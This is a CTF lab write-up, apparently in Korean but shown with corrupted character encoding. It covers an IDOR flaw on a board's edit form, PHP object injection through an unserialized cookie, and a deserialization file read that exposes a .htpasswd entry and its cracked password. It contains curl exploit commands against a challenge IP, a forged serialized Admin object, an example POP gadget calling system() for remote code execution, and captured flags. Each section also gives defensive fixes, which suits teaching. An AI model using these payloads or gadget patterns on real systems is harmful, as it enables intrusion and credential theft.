ê²Œì‹œê¸€ ìˆ˜ì • í”„ë¡œì„¸ìŠ¤ì—ì„œ ë°œìƒí•˜ëŠ” ê²€ì¦ ë¯¸í¡ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬, ê¶Œí•œì´ ì—†ëŠ” ê²Œì‹œê¸€(README)ì˜ ì •ë³´ë¥¼ í™•ì¸í•˜ê±°ë‚˜ ì¡°ì‘í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œë‹¤.

## 2. ì·¨ì•½ì  ë¶„ì„ ë° ê°€ì„¤ ìˆ˜ë¦½

### ê°€ì„¤ 1: IDOR (Insecure Direct Object Reference)
*   ê¸€ ìˆ˜ì • ìš”ì²­ ì‹œ ì „ë‹¬ë˜ëŠ” ê²Œì‹œê¸€ ì‹ë³„ì(ID)ë¥¼ ë³€ì¡°í•˜ë©´, ì„œë²„ê°€ ì‘ì„±ì ì¼ì¹˜ ì—¬ë¶€ë¥¼ ê²€ì‚¬í•˜ì§€ ì•Šê³  í•´ë‹¹ ì‹ë³„ìì— í•´ë‹¹í•˜ëŠ” ë°ì´í„°ë¥¼ ì²˜ë¦¬í•  ê²ƒì´ë‹¤.

### ê°€ì„¤ 2: í”„ë¡œì„¸ìŠ¤ ë¡œì§ ì˜¤ë¥˜
*   ìˆ˜ì •(Edit) ìš”ì²­ ì‹œ ëŒ€ìƒ ë²ˆí˜¸ë¥¼ `README` ë²ˆí˜¸ë¡œ ë°”ê¾¸ë©´, ì„œë²„ê°€ í•´ë‹¹ ê¸€ì˜ ë‚´ìš©ì„ ì‘ë‹µìœ¼ë¡œ ë°˜í™˜í•˜ê±°ë‚˜ ìˆ˜ì • ê¶Œí•œì„ ë¶€ì—¬í•  ê²ƒì´ë‹¤.

### 2ë‹¨ê³„: ê²Œì‹œê¸€ ìˆ˜ì • í”„ë¡œì„¸ìŠ¤ ë³€ì¡°
1.  ê²Œì‹œíŒ ëª©ë¡ì—ì„œ `READ ME` ê²Œì‹œê¸€ì˜ ë²ˆí˜¸(`1736657960`)ë¥¼ í™•ì¸í–ˆë‹¤.
2.  ì„ì˜ì˜ ê¸€ ìˆ˜ì • í™”ë©´(`?mode=modify&view=...`)ìœ¼ë¡œ ì§„ì…í•˜ì—¬ ìˆ˜ì • ìš”ì²­(POST)ì„ ê°€ë¡œì±˜ë‹¤.
3.  ìš”ì²­ ëŒ€ìƒì¸ `view` íŒŒë¼ë¯¸í„° ê°’ì„ ë³¸ì¸ì˜ ê¸€ ë²ˆí˜¸ê°€ ì•„ë‹Œ `1736657960`ìœ¼ë¡œ ë³€ì¡°í•˜ì—¬ ì „ì†¡í–ˆë‹¤.

### 3ë‹¨ê³„: í”Œë˜ê·¸ íšë“
ì„œë²„ëŠ” ìˆ˜ì • ìš”ì²­ì„ ë°›ì€ ì§í›„ í•´ë‹¹ ê¸€ì˜ ì›ë³¸ ë‚´ìš©ì„ ìˆ˜ì • í¼ì— ë‹¤ì‹œ ë‹´ì•„ ì‘ë‹µí–ˆë‹¤. ì´ ê³¼ì •ì—ì„œ `README` ê¸€ ë³¸ë¬¸ì— ìˆ¨ê²¨ì ¸ ìˆë˜ í”Œë˜ê·¸ê°€ ë…¸ì¶œë˜ì—ˆë‹¤.

*   **ìµœì¢… FLAG**: `cb4c7f2e2678ad92367a21084b555c63`

## 4. ê²°ê³¼: ë¶€ì ì ˆí•œ ê¶Œí•œ ê²€ì¦ ë° IDOR ì·¨ì•½ì 
ì„œë²„ê°€ ê²Œì‹œê¸€ì„ ìˆ˜ì •í•˜ê±°ë‚˜ ì½ì–´ì˜¬ ë•Œ, í˜„ì¬ ìš”ì²­ì„ ë³´ë‚¸ ì‚¬ìš©ìê°€ í•´ë‹¹ ê¸€ì˜ ì‹¤ì œ ì‘ì„±ìì¸ì§€ ê²€ì¦í•˜ì§€ ì•Šì•˜ë‹¤. ë‹¨ìˆœí•œ íŒŒë¼ë¯¸í„°(`view`) ë³€ì¡°ë§Œìœ¼ë¡œ íƒ€ì¸ì˜ ë¹„ê³µê°œ ì •ë³´ë‚˜ ê´€ë¦¬ì ê³µì§€ì‚¬í•­ì˜ ë‚´ë¶€ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì‹¬ê°í•œ ì„¤ê³„ ì˜¤ë¥˜ê°€ í™•ì¸ë˜ì—ˆë‹¤.

## 5. ë§ˆë¬´ë¦¬: ë³´ì•ˆ ëŒ€ì±…
1.  **ì„œë²„ ì‚¬ì´ë“œ ê¶Œí•œ ê²€ì¦**: ëª¨ë“  ë°ì´í„° ìˆ˜ì •/ì‚­ì œ/ì¡°íšŒ ìš”ì²­ ì‹œ, ì„¸ì…˜ ì •ë³´ì™€ ë°ì´í„°ì˜ ì†Œìœ ì(Owner)ê°€ ì¼ì¹˜í•˜ëŠ”ì§€ ë°˜ë“œì‹œ ì„œë²„ì—ì„œ ì¬ê²€ì¦í•´ì•¼ í•œë‹¤.
2.  **ê°„ì ‘ ê°ì²´ ì°¸ì¡°**: ìˆ«ìí˜• ì¸ë±ìŠ¤(`1736657960`) ëŒ€ì‹ , ì˜ˆì¸¡ ë¶ˆê°€ëŠ¥í•œ ëœë¤ ë¬¸ìì—´(UUID ë“±)ì„ ì‹ë³„ìë¡œ ì‚¬ìš©í•˜ì—¬ ê³µê²©ìì˜ ì¶”ì¸¡ ì‹œë„ë¥¼ ì°¨ë‹¨í•œë‹¤.
3.  **í”„ë¡œì„¸ìŠ¤ ë‹¨ê³„ë³„ ê²€ì¦**: ìˆ˜ì • í™”ë©´ ì§„ì… ì‹œì ë¿ë§Œ ì•„ë‹ˆë¼, ìˆ˜ì • ì™„ë£Œ(POST) ì‹œì ì—ë„ ê¶Œí•œì„ ì¤‘ë³µìœ¼ë¡œ ì²´í¬í•´ì•¼ í•œë‹¤.

**FLAG**: `cb4c7f2e2678ad92367a21084b555c63`

---

### ğŸ”´ Advanced

#### [Hacking Tutorial] Serialize I: ê°ì²´ì˜ ë³€ì‹ ìˆ , unserialize()ì˜ ì¹˜ëª…ì  ì‹ ë¢°

**ë‚œì´ë„**: ğŸ”´ Advanced
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 90ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#PHP-Object-Injection` `#Unserialize` `#Magic-Methods` `#POP-Chain`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_serialize1.py](../Scripts/solve_serialize1.py)

## 1. ê°œìš”: ë°ì´í„°ê°€ ì•„ë‹ˆë¼ ì½”ë“œê°€ ë˜ëŠ” ìˆœê°„
PHPì˜ `serialize()`ì™€ `unserialize()` í•¨ìˆ˜ëŠ” ë³µì¡í•œ ë°ì´í„° êµ¬ì¡°ë¥¼ ë¬¸ìì—´ë¡œ ë³€í™˜í•˜ê³  ë³µì›í•˜ëŠ” í¸ë¦¬í•œ ê¸°ëŠ¥ì´ë‹¤. í•˜ì§€ë§Œ ì´ "í¸ë¦¬í•¨"ì´ ë³´ì•ˆì˜ ì¹˜ëª…ì ì¸ ì•½ì ì´ ë  ìˆ˜ ìˆë‹¤. íŠ¹íˆ **ì‚¬ìš©ìê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” ë°ì´í„°ë¥¼ unserialize()ì— ë„˜ê¸°ëŠ” ìˆœê°„**, ê³µê²©ìëŠ” ë‹¨ìˆœí•œ ë°ì´í„° ì¡°ì‘ì„ ë„˜ì–´ **ê°ì²´ ìì²´ë¥¼ ì£¼ì…(Object Injection)**í•  ìˆ˜ ìˆê²Œ ëœë‹¤.

## 2. ì½”ë“œ ì •ë°€ ë¶„ì„: ë‘ ê°œì˜ í´ë˜ìŠ¤, í•˜ë‚˜ì˜ í•¨ì •

```php
class Admin {
    function login($id) {
        if($id=="admin") {
            echo("Welcome! $id");
            echo("FLAG is $flag");
            exit();
        }
    }
}

class User {
    public $id;
    public $pw;

    function login($id,$pw) {
        if($id=="guest" && $pw=="guest") {
            $this->id = $id;
            $this->pw = $pw;
            setCookie("user", serialize($this));
            echo("hi $id");
            echo("<a href='index.php'>logout</a>");
            exit();
        }
    }
}

$id = $_GET['id'] ?? null;
$pw = $_GET['pw'] ?? null;
$user = $_COOKIE['user'] ?? null;

if(!empty($id) && !empty($pw)) {
    $info = new User();
    $info -> login($id, $pw);
}

if(!empty($user)) {
    $info = unserialize($user);
    $info -> login($info->id,$info->pw);
}
```

### í•µì‹¬ ì·¨ì•½ì  ë¶„ì„:

1. **Admin í´ë˜ìŠ¤ì˜ ì¡´ì¬**: `Admin::login("admin")`ë§Œ í˜¸ì¶œí•˜ë©´ FLAGë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.
2. **User ë¡œê·¸ì¸ ë¡œì§**: `guest/guest`ë¡œ ë¡œê·¸ì¸í•˜ë©´ User ê°ì²´ê°€ ì§ë ¬í™”ë˜ì–´ ì¿ í‚¤ì— ì €ì¥ëœë‹¤.
3. **unserialize() ë¬´ë°©ë¹„ ì‹ ë¢°**: ì¿ í‚¤ì˜ `user` ê°’ì„ ì•„ë¬´ëŸ° ê²€ì¦ ì—†ì´ `unserialize()`í•œë‹¤!
4. **ë™ì  ë©”ì„œë“œ í˜¸ì¶œ**: `$info->login($info->id, $info->pw)` - ì–´ë–¤ ê°ì²´ë“  login() ë©”ì„œë“œë¥¼ í˜¸ì¶œí•œë‹¤.

### ì¹˜ëª…ì  ì—°ê²°ê³ ë¦¬:

```php
$info = unserialize($user);  // ì¿ í‚¤ì—ì„œ ê°ì²´ ë³µì›
$info->login($info->id, $info->pw);  // ë³µì›ëœ ê°ì²´ì˜ login() í˜¸ì¶œ
```

ë§Œì•½ `$info`ê°€ Admin ê°ì²´ë¼ë©´?
- `Admin::login($info->id)`ê°€ í˜¸ì¶œë¨ (ë‘ ë²ˆì§¸ íŒŒë¼ë¯¸í„°ëŠ” ë¬´ì‹œë¨)
- `$info->id`ê°€ "admin"ì´ë©´ FLAG ì¶œë ¥!

## 3. ì‹œí–‰ì°©ì˜¤: ì •ìƒ ë¡œê·¸ì¸ìœ¼ë¡œ ì¿ í‚¤ êµ¬ì¡° íŒŒì•…

### ì‹œë„ 1: User ë¡œê·¸ì¸ìœ¼ë¡œ ì¿ í‚¤ í˜•ì‹ í™•ì¸

```bash
curl -k -b "PHPSESSID=0qc2jfrqdncj9tkf0g8hrl3042" \
  "https://3.35.141.246/challenges/serialize1/index.php?id=guest&pw=guest"
```

**ì‘ë‹µ ì¿ í‚¤**:
```
Set-Cookie: user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A5%3A%22guest%22%3Bs%3A2%3A%22pw%22%3Bs%3A5%3A%22guest%22%3B%7D
```

**URL ë””ì½”ë”© í›„**:
```
O:4:"User":2:{s:2:"id";s:5:"guest";s:2:"pw";s:5:"guest";}
```

### ì§ë ¬í™” ë¬¸ìì—´ ë¶„ì„:

```
O:4:"User":2:{...}
â”‚ â”‚  â”‚     â”‚
â”‚ â”‚  â”‚     â””â”€ ì†ì„± ê°œìˆ˜ (2ê°œ)
â”‚ â”‚  â””â”€â”€â”€â”€â”€â”€â”€ í´ë˜ìŠ¤ëª… ê¸¸ì´ (4ê¸€ì)
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í´ë˜ìŠ¤ëª… ("User")
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ë°ì´í„° íƒ€ì… (O = Object)

s:2:"id";s:5:"guest";
â”‚ â”‚  â”‚   â”‚ â”‚  â”‚
â”‚ â”‚  â”‚   â”‚ â”‚  â””â”€ ê°’ ("guest")
â”‚ â”‚  â”‚   â”‚ â””â”€â”€â”€â”€ ê°’ ê¸¸ì´ (5)
â”‚ â”‚  â”‚   â””â”€â”€â”€â”€â”€â”€ ë°ì´í„° íƒ€ì… (s = String)
â”‚ â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í‚¤ ("id")
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í‚¤ ê¸¸ì´ (2)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ë°ì´í„° íƒ€ì… (s = String)
```

### ë°œê²¬: êµ¬ì¡°ëŠ” ì´í•´í–ˆì§€ë§Œ ì–´ë–»ê²Œ Admin ê°ì²´ë¥¼ ë§Œë“¤ê¹Œ?

ì²˜ìŒì—” í˜¼ë€ìŠ¤ëŸ¬ì› ë‹¤. Admin í´ë˜ìŠ¤ëŠ” `$id`ì™€ `$pw` ì†ì„±ì´ ì„ ì–¸ë˜ì–´ ìˆì§€ ì•Šì€ë°, ì–´ë–»ê²Œ ì´ ì†ì„±ë“¤ì„ ê°€ì§„ Admin ê°ì²´ë¥¼ ë§Œë“¤ ìˆ˜ ìˆì„ê¹Œ?

**í•µì‹¬ ê¹¨ë‹¬ìŒ**: PHPì˜ `unserialize()`ëŠ” **ë™ì ìœ¼ë¡œ ì†ì„±ì„ ìƒì„±**í•œë‹¤! í´ë˜ìŠ¤ ì •ì˜ì— ì—†ëŠ” ì†ì„±ë„ ì§ë ¬í™” ë¬¸ìì—´ì— ìˆìœ¼ë©´ ê°ì²´ì— ì¶”ê°€ëœë‹¤.

## 4. í˜ì´ë¡œë“œ ì œì‘: Admin ê°ì²´ì˜ íƒ„ìƒ

### Admin ê°ì²´ ì§ë ¬í™” ë¬¸ìì—´ êµ¬ì„±

```
O:5:"Admin":2:{s:2:"id";s:5:"admin";s:2:"pw";s:5:"guest";}
â”‚ â”‚  â”‚      â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚ â”‚  â”‚      â”‚              ì†ì„±ë“¤
â”‚ â”‚  â”‚      â””â”€ ì†ì„± ê°œìˆ˜ 2ê°œ
â”‚ â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€ í´ë˜ìŠ¤ëª… ê¸¸ì´ 5 ("Admin")
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í´ë˜ìŠ¤ëª… "Admin"
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ê°ì²´ íƒ€ì…
```

**Pythonìœ¼ë¡œ URL ì¸ì½”ë”©**:
```python
import urllib.parse
payload = 'O:5:"Admin":2:{s:2:"id";s:5:"admin";s:2:"pw";s:5:"guest";}'
encoded = urllib.parse.quote(payload)
# O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A5%3A%22admin%22%3Bs%3A2%3A%22pw%22%3Bs%3A5%3A%22guest%22%3B%7D
```

## 5. ìµœì¢… ê³µê²© (The Exploit)

### ê³µê²© ì‹¤í–‰ íë¦„:

1. **ì¿ í‚¤ ì„¤ì •**: Admin ê°ì²´ë¥¼ ì§ë ¬í™”í•œ ë¬¸ìì—´ì„ `user` ì¿ í‚¤ì— ì„¤ì •
2. **í˜ì´ì§€ ì ‘ì†**: ì¿ í‚¤ì™€ í•¨ê»˜ í˜ì´ì§€ ë¡œë“œ
3. **ì„œë²„ ì²˜ë¦¬**:
   ```php
   $user = $_COOKIE['user'];
   // "O:5:\"Admin\":2:{...}"

   $info = unserialize($user);
   // Admin ê°ì²´ ìƒì„±ë¨! $info->id = "admin"

   $info->login($info->id, $info->pw);
   // Admin::login("admin", "guest") í˜¸ì¶œ
   // Admin::login()ì€ ì²« ë²ˆì§¸ íŒŒë¼ë¯¸í„°ë§Œ ì‚¬ìš©

   if($id == "admin") {  // true!
       echo("FLAG is $flag");
   }
   ```

### ìµœì¢… í˜ì´ë¡œë“œ:

```bash
curl -k \
  -b "PHPSESSID=0qc2jfrqdncj9tkf0g8hrl3042" \
  -b "user=O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A5%3A%22admin%22%3Bs%3A2%3A%22pw%22%3Bs%3A5%3A%22guest%22%3B%7D" \
  "https://3.35.141.246/challenges/serialize1/index.php"
```

## 6. ì„±ê³µ ê²°ê³¼

```html
Welcome! admin<br>
FLAG is 71c832f0241201c891d0a6ccd2a6bb87
```

**FLAG**: `71c832f0241201c891d0a6ccd2a6bb87`

## 7. ê³µê²© ë©”ì»¤ë‹ˆì¦˜ ìƒì„¸ ë¶„ì„

### ì™œ ì´ ê³µê²©ì´ ê°€ëŠ¥í•œê°€?

#### 1. unserialize()ì˜ ì‹ ë¢° ë¬¸ì œ

```php
$info = unserialize($user);  // ê²€ì¦ ì—†ìŒ!
```

PHPì˜ `unserialize()`ëŠ”:
- ë¬¸ìì—´ì—ì„œ **í´ë˜ìŠ¤ íƒ€ì…ì„ ì½ì–´ ê°ì²´ë¥¼ ìƒì„±**í•œë‹¤
- í•´ë‹¹ í´ë˜ìŠ¤ê°€ ì¡´ì¬í•˜ë©´ **ì¸ìŠ¤í„´ìŠ¤ë¥¼ ë§Œë“¤ê³  ì†ì„±ì„ ì±„ìš´ë‹¤**
- `__wakeup()`, `__destruct()` ê°™ì€ ë§¤ì§ ë©”ì„œë“œë„ ìë™ í˜¸ì¶œëœë‹¤

#### 2. ë™ì  ì†ì„± ìƒì„±

```php
class Admin {
    function login($id) { ... }
    // $id, $pw ì†ì„±ì´ ì„ ì–¸ë˜ì§€ ì•ŠìŒ!
}

// í•˜ì§€ë§Œ unserializeëŠ” ì´ê²ƒì„ í—ˆìš©:
unserialize('O:5:"Admin":2:{s:2:"id";s:5:"admin";...}');
// â†’ Admin ê°ì²´ì— ë™ì ìœ¼ë¡œ $id, $pw ì†ì„± ì¶”ê°€!
```

#### 3. ë©”ì„œë“œ ì‹œê·¸ë‹ˆì²˜ ë¶ˆì¼ì¹˜ í—ˆìš©

```php
// Admin::loginì€ íŒŒë¼ë¯¸í„° 1ê°œ
function login($id) { ... }

// í•˜ì§€ë§Œ 2ê°œë¡œ í˜¸ì¶œí•´ë„ ë¨ (ë‘ ë²ˆì§¸ëŠ” ë¬´ì‹œ)
$info->login($info->id, $info->pw);
```

## 8. ë³´ì•ˆ êµí›ˆ

### ë¬¸ì œì :

1. **ì‚¬ìš©ì ì…ë ¥ì„ unserialize()ì— ì „ë‹¬**: ì¿ í‚¤ëŠ” ì‚¬ìš©ìê°€ ì™„ì „íˆ ì œì–´ ê°€ëŠ¥
2. **ê°ì²´ íƒ€ì… ê²€ì¦ ë¶€ì¬**: unserialize í›„ ê°ì²´ íƒ€ì…ì„ í™•ì¸í•˜ì§€ ì•ŠìŒ
3. **í´ë˜ìŠ¤ ìë™ ë¡œë”©**: ê³µê²©ìê°€ ì„ íƒí•œ í´ë˜ìŠ¤ë¥¼ ììœ ë¡­ê²Œ ì¸ìŠ¤í„´ìŠ¤í™”
4. **Magic Method ìë™ ì‹¤í–‰**: `__wakeup()`, `__destruct()` ë“±ì´ ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ì–´ ì¶”ê°€ ê³µê²© ë²¡í„° ì œê³µ

### ì˜¬ë°”ë¥¸ ì½”ë“œ:

```php
// âŒ ë‚˜ìœ ì˜ˆ
$info = unserialize($_COOKIE['user']);

// âœ… ì¢‹ì€ ì˜ˆ 1: JSON ì‚¬ìš©
$data = json_decode($_COOKIE['user'], true);
if($data['type'] === 'user') {
    $info = new User();
    $info->id = $data['id'];
    $info->pw = $data['pw'];
}

// âœ… ì¢‹ì€ ì˜ˆ 2: íƒ€ì… ê²€ì¦
$info = unserialize($_COOKIE['user']);
if(!($info instanceof User)) {
    die("Invalid object type");
}

// âœ… ì¢‹ì€ ì˜ˆ 3: ì„œëª…(HMAC) ê²€ì¦
$signature = hash_hmac('sha256', $serialized, SECRET_KEY);
$cookie = base64_encode($serialized . '|' . $signature);
// ë³µì› ì‹œ ì„œëª… ê²€ì¦ í•„ìˆ˜
```

### POP Chain (Property-Oriented Programming)

ì´ ë¬¸ì œëŠ” ê°„ë‹¨í•œ Object Injectionì´ì§€ë§Œ, ì‹¤ì œ í™˜ê²½ì—ì„œëŠ” **POP Chain**ìœ¼ë¡œ ë°œì „í•  ìˆ˜ ìˆë‹¤:

```php
class FileLogger {
    private $filename;
    function __destruct() {
        file_put_contents($this->filename, "Log");
        // ê³µê²©ìê°€ $filename = "/var/www/shell.php" ì„¤ì • ê°€ëŠ¥!
    }
}

class ImageProcessor {
    private $command;
    function __wakeup() {
        system($this->command);
        // RCE ê°€ëŠ¥!
    }
}
```

ê³µê²©ìëŠ” ì´ëŸ° "ê°€ì ¯(gadget)" í´ë˜ìŠ¤ë“¤ì„ ì—°ê²°í•´ ë³µì¡í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.

## 9. ê²°ë¡ : ë°ì´í„°ì™€ ì½”ë“œì˜ ê²½ê³„

`serialize()`ëŠ” ë‹¨ìˆœíˆ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ì§€ë§Œ, **ê°ì²´ì˜ ì²­ì‚¬ì§„ê³¼ ìƒíƒœë¥¼ í•¨ê»˜ ì €ì¥**í•œë‹¤. `unserialize()`ëŠ” ì´ ì²­ì‚¬ì§„ì„ ì½ê³  **ì‹¤ì œ ì‹¤í–‰ ê°€ëŠ¥í•œ ê°ì²´ë¥¼ ìƒì„±**í•œë‹¤.

ì¦‰, ì§ë ¬í™”ëœ ë¬¸ìì—´ì€ **ë°ì´í„°ê°€ ì•„ë‹ˆë¼ ì½”ë“œ**ë‹¤. ì‚¬ìš©ìê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” "ì½”ë“œ"ë¥¼ ì„œë²„ì—ì„œ ì‹¤í–‰í•˜ë„ë¡ í—ˆìš©í•˜ëŠ” ìˆœê°„, ë³´ì•ˆì€ ë¬´ë„ˆì§„ë‹¤.

ì´ ë¬¸ì œëŠ” PHP Serializationì˜ ê¸°ë³¸ ì›ë¦¬ì™€ ìœ„í—˜ì„±ì„ ì™„ë²½í•˜ê²Œ ë³´ì—¬ì£¼ëŠ” êµê³¼ì„œì ì¸ ì‚¬ë¡€ì˜€ë‹¤. `unserialize()`ë¥¼ ì‚¬ìš©í•  ë•ŒëŠ” **ì ˆëŒ€ë¡œ ì‚¬ìš©ì ì…ë ¥ì„ ì‹ ë¢°í•˜ì§€ ë§ì•„ì•¼ í•œë‹¤**ëŠ” ì² ì¹™ì„ ë‹¤ì‹œ í•œë²ˆ ê°ì¸ì‹œì¼œì¤€ 100ì ì§œë¦¬ ë¬¸ì œì˜€ë‹¤.

---

#### [Hacker's Diary] Serialize II: íŒŒì¼ ì†ì— ìˆ¨ê²¨ì§„ ì¸ì¦ ì •ë³´

**ë‚œì´ë„**: ğŸ”´ Advanced
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 60ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#Unserialize` `#File-Read` `#Magic-Methods` `#Vulnerability-Chaining` `#htpasswd`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_serialize2.py](../Scripts/solve_serialize2.py)

## 1. ê°œìš”
PHPì˜ `unserialize()` ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ì„œë²„ ë‚´ì˜ íŒŒì¼ì„ ì½ê³  í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œë‹¤. `login` í´ë˜ìŠ¤ì˜ `__destruct()` ë§¤ì§ ë©”ì„œë“œê°€ íŒŒì¼ì„ ì½ëŠ” ê¸°ëŠ¥ì„ ìˆ˜í–‰í•œë‹¤.

## 2. ì·¨ì•½ì  ë¶„ì„ ë° ê°€ì„¤ ìˆ˜ë¦½

### ì·¨ì•½ì  ë°œê²¬
*   `index.php`ì—ì„œ `userinfo` íŒŒë¼ë¯¸í„°ë¥¼ `base64_decode` í›„ `unserialize` í•œë‹¤.
*   `login` í´ë˜ìŠ¤ì˜ `__destruct()` ë©”ì„œë“œëŠ” `$this->id`ë¥¼ íŒŒì¼ëª…ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ `users/` í´ë” ë‚´ì˜ íŒŒì¼ì„ ì½ì–´ ì¶œë ¥í•œë‹¤.

### í•„í„°ë§ ë¶„ì„
*   `preg_match("/|\.\.|:", $user)`: ìƒìœ„ ë””ë ‰í† ë¦¬ ì´ë™(`..`)ê³¼ í”„ë¡œí† ì½œ(`:`) ì‚¬ìš©ì„ ì œí•œí•œë‹¤.
*   `|` ë¬¸ìê°€ ì •ê·œí‘œí˜„ì‹ ì²˜ìŒì— ìœ„ì¹˜í•˜ì—¬ ëª¨ë“  ë¬¸ìì—´ì„ ì°¨ë‹¨í•˜ëŠ”ì§€, í˜¹ì€ `|` ë¬¸ì ìì²´ë¥¼ ê²€ì‚¬í•˜ëŠ”ì§€ í™•ì¸ì´ í•„ìš”í•˜ë‹¤.

### ê³µê²© ê°€ì„¤
1.  **ì¸ì¦ ì •ë³´ íŒŒì¼**: ë¬¸ì œ íŒíŠ¸ì— ë”°ë¼ `.htpasswd`ë‚˜ `admin` ë“±ì˜ íŒŒì¼ì„ ì½ì–´ í”Œë˜ê·¸ë¥¼ ì°¾ëŠ”ë‹¤.
2.  **ê²½ë¡œ**: íŒŒì¼ì€ `.../users/` ë””ë ‰í† ë¦¬ì— ìœ„ì¹˜í•œë‹¤.

## 3. ê³µê²© ì‹¤í–‰ ë° ê²€ì¦

### 1ë‹¨ê³„: í•„í„°ë§ ì·¨ì•½ì  í™•ì¸
`preg_match("/|\.\.|:", $user)` ì •ê·œí‘œí˜„ì‹ì´ ì˜¤ë¥˜ í˜¹ì€ ë¡œì§ ë¬¸ì œë¡œ ì¸í•´ `..`ì´ë‚˜ `/`ë¥¼ ì œëŒ€ë¡œ ë§‰ì§€ ëª»í•˜ëŠ” ê²ƒì„ í™•ì¸í–ˆë‹¤. `Not found` ì‘ë‹µì„ í†µí•´ íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼ì´ ê°€ëŠ¥í•¨ì„ íŒŒì•…í–ˆë‹¤.

### 2ë‹¨ê³„: ì¸ì¦ ì •ë³´ íšë“
`users/` ë””ë ‰í† ë¦¬ ë‚´ì˜ ì£¼ìš” íŒŒì¼ì„ íƒìƒ‰í•œ ê²°ê³¼ ë‹¤ìŒ ë‘ íŒŒì¼ì„ ë°œê²¬í–ˆë‹¤.
1.  **.htpasswd**: `JohntheRipper:dBXXhz6nTBILA`
2.  **.htaccess**:
    ```apache
    AuthType Basic
    AuthUserFile "/var/www/fnctf/challenges/serialize2/users/.htpasswd"
    Require valid-user
    options all indexes
    ```
    * `options all indexes` ì„¤ì •ìœ¼ë¡œ ì¸í•´ ì¸ì¦ ì„±ê³µ ì‹œ ë””ë ‰í† ë¦¬ ë‚´ì˜ íŒŒì¼ ëª©ë¡ì„ ë³¼ ìˆ˜ ìˆìŒì„ í™•ì¸í–ˆë‹¤.

### 3ë‹¨ê³„: ë¹„ë°€ë²ˆí˜¸ í•´ë… ë° ìƒê´€ê´€ê³„ ë¶„ì„
**John the Ripper**ë¥¼ í†µí•´ í•´ë…í•œ ê²°ê³¼, `JohntheRipper` ê³„ì •ì˜ ì‹¤ì œ ë¹„ë°€ë²ˆí˜¸ëŠ” **`24680`**ì„ì´ ë°í˜€ì¡Œë‹¤.
ì¸ì¦ í›„ ì ‘ê·¼í•œ ë””ë ‰í† ë¦¬ì—ì„œ ë°œê²¬ëœ `405453d5eef09cc111b9d9b814c81f67.php` íŒŒì¼ëª…ì€ ë¹„ë°€ë²ˆí˜¸ `24680`ì˜ **MD5 í•´ì‹œê°’**ì´ë‹¤.

### 4ë‹¨ê³„: ì†ŒìŠ¤ ì½”ë“œ ë¶„ì„ ë° í”Œë˜ê·¸ íšë“
ë¹„ë°€ë²ˆí˜¸ `24680`ì˜ MD5 í•´ì‹œê°’ì¸ `405453d5eef09cc111b9d9b814c81f67`ì„ íŒŒì¼ëª…ìœ¼ë¡œ í•˜ëŠ” PHP ìŠ¤í¬ë¦½íŠ¸ì— ì ‘ê·¼í–ˆë‹¤. í•´ë‹¹ íŒŒì¼ì€ `pass` íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ 2ì°¨ ì¸ì¦ì„ ìˆ˜í–‰í•˜ëŠ” êµ¬ì¡°ì˜€ìœ¼ë©°, ì •í™•í•œ ê°’ì„ ì…ë ¥í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í–ˆë‹¤.

*   **ìµœì¢… URL**: `http://3.35.141.246/challenges/serialize2/users/405453d5eef09cc111b9d9b814c81f67.php?pass=24680`
*   **ìµœì¢… FLAG**: `151af6b8359aef91193796d8a77b0e53`

## 4. ê²°ê³¼: ë³µí•©ì ì¸ ì·¨ì•½ì  ì‚¬ìŠ¬(Vulnerability Chain)ì˜ ìœ„ë ¥
ë‹¨ì¼ ì·¨ì•½ì (Insecure Deserialization)ì—ì„œ ì‹œì‘í•˜ì—¬, ì •ë³´ ìœ ì¶œ(htpasswd), ì·¨ì•½í•œ ì•”í˜¸í™” ì•Œê³ ë¦¬ì¦˜(DES), ê·¸ë¦¬ê³  ì˜ˆì¸¡ ê°€ëŠ¥í•œ íŒŒì¼ëª… ìƒì„± ê·œì¹™(MD5)ì´ ì‚¬ìŠ¬ì²˜ëŸ¼ ì—®ì—¬ ì‹œìŠ¤í…œì˜ ìµœì¢… ê¶Œí•œì´ íƒˆì·¨ëœ ì‚¬ë¡€ë‹¤.

## 5. ë§ˆë¬´ë¦¬: ë³´ì•ˆ ëŒ€ì±…
